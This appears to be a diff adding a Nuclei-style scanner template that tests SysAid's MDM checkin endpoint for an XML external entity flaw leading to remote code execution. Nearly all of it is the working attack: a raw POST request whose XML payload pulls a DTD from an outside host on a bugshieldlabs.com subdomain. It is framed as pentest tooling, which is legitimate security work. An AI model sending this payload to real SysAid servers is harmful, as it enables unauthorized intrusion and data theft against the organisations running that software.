@@ -1,0 +1,25 @@
+id: sarce
+
+info:
+  name: SysAid RCE Check
+  author: n0ur5
+  severity: high
+  description: |
+    Attempts to exploit a remote code execution vulnerability via XML external entity (XXE)
+    in SysAid's MDM checkin endpoint. Designed for BugShieldLabs testing with a custom DTD server.
+
+http:
+  - raw:
+      - |
+        POST /mdm/checkin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 129
+
+        <?xml version="1.0" ?>
+        <!DOCTYPE foo [
+        <!ENTITY % foo SYSTEM "http://9lvha5auyftkz4l5o41p6x9ak1qsep2e.n0ur5sec.bugshieldlabs.com/SysAid.dtd">
+        %foo;
+        ]>
+
+    max-redirects: 5
